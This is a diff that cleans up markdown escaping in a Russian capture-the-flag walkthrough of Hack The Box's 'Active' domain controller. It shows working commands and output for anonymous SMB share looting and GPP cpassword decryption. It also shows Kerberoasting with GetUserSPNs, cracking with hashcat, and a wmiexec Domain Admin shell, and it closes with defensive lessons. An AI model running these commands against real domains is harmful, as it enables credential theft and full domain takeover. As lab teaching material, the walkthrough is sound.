@@ -28,15 +28,15 @@
 
 ├── Share Replication readable anonymously (SYSVOL replica)
 
-├── smbclient //.../Replication -N -c 'recurse ON; mget \*' → Groups.xml
+├── smbclient //.../Replication -N -c 'recurse ON; mget *' → Groups.xml
 
 ├── Groups.xml: cpassword="<GPP_CPASSWORD>"
 
-└── gpp-decrypt → SVC\_TGS:<PASSWORD>
+└── gpp-decrypt → SVC_TGS:<PASSWORD>
 
 Аутентифицированное Перечисление
 
-├── smbclient -L //10.129.84.160/ -U 'SVC\_TGS%<PASSWORD>' → Users, SYSVOL, Replication readable
+├── smbclient -L //10.129.84.160/ -U 'SVC_TGS%<PASSWORD>' → Users, SYSVOL, Replication readable
 
 ├── smbclient //.../Users -c 'get user.txt' → <USER_FLAG>
 
@@ -48,7 +48,7 @@
 
 └── wmiexec.py active.htb/Administrator:<PASSWORD>@10.129.84.160 → shell
 
-&#x20;   └── type C:\\Users\\Administrator\\Desktop\\root.txt → <ROOT_FLAG>
+    └── type C:\Users\Administrator\Desktop\root.txt → <ROOT_FLAG>
 
 ```
 
@@ -81,7 +81,7 @@ nmap -sC -sV -Pn -n --open -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9
 
 ```
 
-\*\*Результат (detail):\*\*
+**Результат (detail):**
 
 ```
 
@@ -101,7 +101,7 @@ PORT      STATE SERVICE       VERSION
 
 464/tcp   open  kpasswd5?
 
-593/tcp   open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 
 636/tcp   open  tcpwrapped
 
@@ -119,7 +119,7 @@ PORT      STATE SERVICE       VERSION
 
 ...
 
-Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\_server\_2008:r2:sp1
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1
 
 Host script results:
 
@@ -127,7 +127,7 @@ Host script results:
 
 |   2.1:
 
-|\_    Message signing enabled and required
+|_    Message signing enabled and required
 
 ```
 
@@ -151,7 +151,7 @@ Host script results:
 
 | 464   | kpasswd5      | Kerberos password change                  |
 
-| 593   | RPC over HTTP | ncacn\_http                                |
+| 593   | RPC over HTTP | ncacn_http                                |
 
 | 636   | LDAPS         | tcpwrapped                                |
 
@@ -173,7 +173,7 @@ echo "10.129.84.160    active.htb dc.active.htb" | sudo tee -a /etc/hosts
 
 ```
 
-\*\*Ключевое наблюдение:\*\* `dns-nsid` показывает `Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)`, LDAP сообщает домен `active.htb`. Это legacy DC (2008 R2) - ожидаем GPP-подобные ошибки конфигурации, Kerberos только с RC4, отсутствие современных митигаций.
+**Ключевое наблюдение:** `dns-nsid` показывает `Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)`, LDAP сообщает домен `active.htb`. Это legacy DC (2008 R2) - ожидаем GPP-подобные ошибки конфигурации, Kerberos только с RC4, отсутствие современных митигаций.
 
 ---
 
@@ -187,29 +187,29 @@ smbclient -L //10.129.84.160/ -N
 
 ```
 
-\*\*Результат:\*\*
+**Результат:**
 
 ```
 
 Anonymous login successful
 
-&#x20;       Sharename       Type      Comment
+        Sharename       Type      Comment
 
-&#x20;       ---------       ----      -------
+        ---------       ----      -------
 
-&#x20;       ADMIN$          Disk      Remote Admin
+        ADMIN$          Disk      Remote Admin
 
-&#x20;       C$              Disk      Default share
+        C$              Disk      Default share
 
-&#x20;       IPC$            IPC       Remote IPC
+        IPC$            IPC       Remote IPC
 
-&#x20;       NETLOGON        Disk      Logon server share
+        NETLOGON        Disk      Logon server share
 
-&#x20;       Replication     Disk
+        Replication     Disk
 
-&#x20;       SYSVOL          Disk      Logon server share
+        SYSVOL          Disk      Logon server share
 
-&#x20;       Users           Disk
+        Users           Disk
 
 ```
 
@@ -221,21 +221,21 @@ Anonymous login successful
 
 mkdir -p \~/Desktop/active/Replication; cd \~/Desktop/active/Replication
 
-smbclient //10.129.84.160/Replication -N -c 'recurse ON; prompt OFF; mget \*'
+smbclient //10.129.84.160/Replication -N -c 'recurse ON; prompt OFF; mget *'
 
 ```
 
-\*\*Результат:\*\*
+**Результат:**
 
 ```
 
-getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI ...
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI ...
 
-getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\GPE.INI ...
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI ...
 
-getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Registry.pol ...
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol ...
 
-getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml ...
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml ...
 
 ...
 
@@ -249,7 +249,7 @@ find \~/Desktop/active/Replication -iname 'Groups.xml'
 
 ```
 
-\*\*Результат:\*\*
+**Результат:**
 
 ```
 
@@ -265,7 +265,7 @@ cat "$(find \~/Desktop/active/Replication -iname 'Groups.xml' | head -1)"
 
 ```
 
-\*\*Результат:\*\*
+**Результат:**
 
 ```xml
 
@@ -273,17 +273,17 @@ cat "$(find \~/Desktop/active/Replication -iname 'Groups.xml' | head -1)"
 
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
 
-&#x20; <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\\SVC\_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
+  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
 
-&#x20;   <Properties action="U" newName="" fullName="" description="" cpassword="<GPP_CPASSWORD>" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\\SVC\_TGS"/>
+    <Properties action="U" newName="" fullName="" description="" cpassword="<GPP_CPASSWORD>" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
 
-&#x20; </User>
+  </User>
 
 </Groups>
 
 ```
 
-Атрибут `cpassword` - это зашифрованный пароль. Microsoft опубликовала AES-256 ключ, используемый GPP, в 2012 году (MSDN \[MS-GPPREF] 2.2.1.1.4), поэтому расшифровка тривиальна:
+Атрибут `cpassword` - это зашифрованный пароль. Microsoft опубликовала AES-256 ключ, используемый GPP, в 2012 году (MSDN [MS-GPPREF] 2.2.1.1.4), поэтому расшифровка тривиальна:
 
 ```bash
 
@@ -291,7 +291,7 @@ gpp-decrypt '<GPP_CPASSWORD>'
 
 ```
 
-\*\*Результат:\*\*
+**Результат:**
 
 ```
 
@@ -299,7 +299,7 @@ gpp-decrypt '<GPP_CPASSWORD>'
 
 ```
 
-Получены учётные данные: `active.htb\\SVC\_TGS : <PASSWORD>`.
+Получены учётные данные: `active.htb\SVC_TGS : <PASSWORD>`.
 
 ---
 
@@ -309,23 +309,23 @@ gpp-decrypt '<GPP_CPASSWORD>'
 
 ```bash
 
-smbclient -L //10.129.84.160/ -U 'active.htb\\SVC\_TGS%<PASSWORD>'
+smbclient -L //10.129.84.160/ -U 'active.htb\SVC_TGS%<PASSWORD>'
 
 ```
 
-\*\*Результат:\*\* `Users`, `SYSVOL`, и `Replication` доступны. `ADMIN$`, `C$`, `IPC$` недоступны для non-admin аккаунта.
+**Результат:** `Users`, `SYSVOL`, и `Replication` доступны. `ADMIN$`, `C$`, `IPC$` недоступны для non-admin аккаунта.
 
 Флаг пользователя лежит в шаре `Users`:
 
 ```bash
 
-smbclient //10.129.84.160/Users -U 'active.htb\\SVC\_TGS%<PASSWORD>' -c 'cd "SVC\_TGS\\Desktop"; ls; get user.txt'
+smbclient //10.129.84.160/Users -U 'active.htb\SVC_TGS%<PASSWORD>' -c 'cd "SVC_TGS\Desktop"; ls; get user.txt'
 
 cat user.txt
 
 ```
 
-\*\*Результат:\*\*
+**Результат:**
 
 ```
 
@@ -333,15 +333,15 @@ cat user.txt
 
 ```
 
-Далее перечисляем аккаунты с Service Principal Name - они Kerberoastable. Impacket `GetUserSPNs.py` аутентифицируется как `SVC\_TGS` и запрашивает TGS-REP тикет для каждого SPN, который видит:
+Далее перечисляем аккаунты с Service Principal Name - они Kerberoastable. Impacket `GetUserSPNs.py` аутентифицируется как `SVC_TGS` и запрашивает TGS-REP тикет для каждого SPN, который видит:
 
 ```bash
 
-GetUserSPNs.py active.htb/SVC\_TGS:<PASSWORD> -dc-ip 10.129.84.160 -request -outputfile \~/Desktop/active/tgs.hash
+GetUserSPNs.py active.htb/SVC_TGS:<PASSWORD> -dc-ip 10.129.84.160 -request -outputfile \~/Desktop/active/tgs.hash
 
 ```
 
-\*\*Результат:\*\*
+**Результат:**
 
 ```
 
@@ -355,7 +355,7 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 
 ```
 
-\*\*Ключевое наблюдение:\*\* аккаунт `Administrator` сам имеет SPN (`active/CIFS:445`). Поскольку `Administrator` - Domain Admin, TGS-REP тикет зашифрован NTLM хэшем Domain Admin аккаунта - его взлом даёт полный контроль над доменом.
+**Ключевое наблюдение:** аккаунт `Administrator` сам имеет SPN (`active/CIFS:445`). Поскольку `Administrator` - Domain Admin, TGS-REP тикет зашифрован NTLM хэшем Domain Admin аккаунта - его взлом даёт полный контроль над доменом.
 
 Хэш записан в `\~/Desktop/active/tgs.hash`:
 
@@ -371,7 +371,7 @@ wc -c \~/Desktop/active/tgs.hash
 
 ## Эксплуатация
 
-No CVE (custom vulnerability) - Group Policy Preferences хранят значение `cpassword` зашифрованным статическим AES-256 ключом, опубликованным Microsoft (MSDN \[MS-GPPREF] 2.2.1.1.4, 2012); SYSVOL доступен всем аутентифицированным пользователям по дизайну. Анонимный доступ на чтение к реплике SYSVOL раскрыл зашифрованный пароль неаутентифицированному атакующему.
+No CVE (custom vulnerability) - Group Policy Preferences хранят значение `cpassword` зашифрованным статическим AES-256 ключом, опубликованным Microsoft (MSDN [MS-GPPREF] 2.2.1.1.4, 2012); SYSVOL доступен всем аутентифицированным пользователям по дизайну. Анонимный доступ на чтение к реплике SYSVOL раскрыл зашифрованный пароль неаутентифицированному атакующему.
 
 No CVE (design weakness) - Kerberoasting злоупотребляет легитимным Kerberos TGS-REQ / TGS-REP потоком; любой аутентифицированный пользователь может запросить service ticket для любого SPN и взломать его офлайн, потому что тикет зашифрован NTLM хэшем сервисного аккаунта. Уязвимости в протоколе нет - только слабый, словарный пароль сервисного аккаунта.
 
@@ -387,7 +387,7 @@ hashcat -m 13100 \~/Desktop/active/tgs.hash /usr/share/wordlists/rockyou.txt --f
 
 ```
 
-\*\*Результат:\*\*
+**Результат:**
 
 ```
 
@@ -395,7 +395,7 @@ hashcat (v7.1.2) starting
 
 ...
 
-$krb5tgs$23$\*Administrator$ACTIVE.HTB$...:<PASSWORD>
+$krb5tgs$23$*Administrator$ACTIVE.HTB$...:<PASSWORD>
 
 ...
 
@@ -405,7 +405,7 @@ Status...........: Cracked
 
 Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
 
-Hash.Target......: $krb5tgs$23$\*Administrator$ACTIVE.HTB$active.htb/Ad...651dcc
+Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...651dcc
 
 Time.Started.....: ... (5 secs)
 
@@ -415,7 +415,7 @@ Progress.........: 10543104/14344385 (73.50%)
 
 ```
 
-Получены учётные данные: `active.htb\\Administrator : <PASSWORD>`.
+Получены учётные данные: `active.htb\Administrator : <PASSWORD>`.
 
 Аккаунт - Domain Admin. Impacket `wmiexec.py` даёт полуинтерактивный shell через WMI/SMB:
 
@@ -425,23 +425,23 @@ wmiexec.py active.htb/Administrator:<PASSWORD>@10.129.84.160
 
 ```
 
-\*\*Результат:\*\*
+**Результат:**
 
 ```
 
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
-\[\*] SMBv2.1 dialect used
+[*] SMBv2.1 dialect used
 
-\[!] Launching semi-interactive shell - Careful what you execute
+[!] Launching semi-interactive shell - Careful what you execute
 
-\[!] Press help for extra shell commands
+[!] Press help for extra shell commands
 
-C:\\>whoami
+C:\>whoami
 
-active\\administrator
+active\administrator
 
-C:\\>type C:\\Users\\Administrator\\Desktop\\root.txt
+C:\>type C:\Users\Administrator\Desktop\root.txt
 
 <ROOT_FLAG>
 
@@ -463,17 +463,17 @@ C:\\>type C:\\Users\\Administrator\\Desktop\\root.txt
 
 ## Ключевые Выводы
 
-\- \*\*Анонимный SMB на Domain Controller - критическая ошибка конфигурации.\*\* Шара `Replication` раскрыла полную реплику SYSVOL неаутентифицированным пользователям. SYSVOL по дизайну доступен аутентифицированным пользователям, но не анонимно.
+- **Анонимный SMB на Domain Controller - критическая ошибка конфигурации.** Шара `Replication` раскрыла полную реплику SYSVOL неаутентифицированным пользователям. SYSVOL по дизайну доступен аутентифицированным пользователям, но не анонимно.
 
-\- \*\*Group Policy Preferences (GPP) `cpassword` фактически является открытым текстом.\*\* Microsoft опубликовала AES-256 ключ в 2012 (MSDN \[MS-GPPREF] 2.2.1.1.4) и закрыла новые GPP-развёртывания в MS14-025, но патч не удаляет существующие значения `cpassword` из SYSVOL. Никогда не храните учётные данные в GPP.
+- **Group Policy Preferences (GPP) `cpassword` фактически является открытым текстом.** Microsoft опубликовала AES-256 ключ в 2012 (MSDN [MS-GPPREF] 2.2.1.1.4) и закрыла новые GPP-развёртывания в MS14-025, но патч не удаляет существующие значения `cpassword` из SYSVOL. Никогда не храните учётные данные в GPP.
 
-\- \*\*Не привязывайте SPN к высокопривилегированным аккаунтам.\*\* Здесь `Administrator` сам имел SPN (`active/CIFS:445`). Любой аутентифицированный пользователь (включая низкопривилегированного `SVC\_TGS`) мог запросить его TGS-REP и взломать офлайн, получив мгновенный доступ Domain Admin.
+- **Не привязывайте SPN к высокопривилегированным аккаунтам.** Здесь `Administrator` сам имел SPN (`active/CIFS:445`). Любой аутентифицированный пользователь (включая низкопривилегированного `SVC_TGS`) мог запросить его TGS-REP и взломать офлайн, получив мгновенный доступ Domain Admin.
 
-\- \*\*Kerberoasting - это слабость дизайна, а не уязвимость.\*\* Защита - длинные, случайно сгенерированные пароли сервисных аккаунтов (или gMSA с автоматической ротацией), а не патчинг протокола. Мониторьте необычный объём TGS-REQ (Event ID 4769 с RC4 шифрованием).
+- **Kerberoasting - это слабость дизайна, а не уязвимость.** Защита - длинные, случайно сгенерированные пароли сервисных аккаунтов (или gMSA с автоматической ротацией), а не патчинг протокола. Мониторьте необычный объём TGS-REQ (Event ID 4769 с RC4 шифрованием).
 
-\- \*\*RC4 (etype 23) делает Kerberoasting быстрым.\*\* В 2026 Microsoft формально связала RC4-based Kerberoasting с CVE-2026-20833 (Kerberos information disclosure, CVSS 5.5) и начала отключать RC4 по умолчанию на Domain Controllers (enforcement с июля 2026). Домен `active.htb` в этом walkthrough всё ещё использовал RC4 на момент атаки.
+- **RC4 (etype 23) делает Kerberoasting быстрым.** В 2026 Microsoft формально связала RC4-based Kerberoasting с CVE-2026-20833 (Kerberos information disclosure, CVSS 5.5) и начала отключать RC4 по умолчанию на Domain Controllers (enforcement с июля 2026). Домен `active.htb` в этом walkthrough всё ещё использовал RC4 на момент атаки.
 
-\- \*\*SMB signing включён и обязателен\*\* предотвратил SMB relay - машина была защищена от одного класса атак, оставаясь уязвимой к другим.
+- **SMB signing включён и обязателен** предотвратил SMB relay - машина была защищена от одного класса атак, оставаясь уязвимой к другим.
 
-\- \*\*Многослойная ошибка:\*\* одного утекшего пароля низкопривилегированного сервисного аккаунта (`SVC\_TGS`) было достаточно, потому что модель прав AD по умолчанию позволяет любому аутентифицированному пользователю запрашивать service tickets для любого SPN, а самый привилегированный аккаунт в домене был Kerberoastable.
+- **Многослойная ошибка:** одного утекшего пароля низкопривилегированного сервисного аккаунта (`SVC_TGS`) было достаточно, потому что модель прав AD по умолчанию позволяет любому аутентифицированному пользователю запрашивать service tickets для любого SPN, а самый привилегированный аккаунт в домене был Kerberoastable.
 
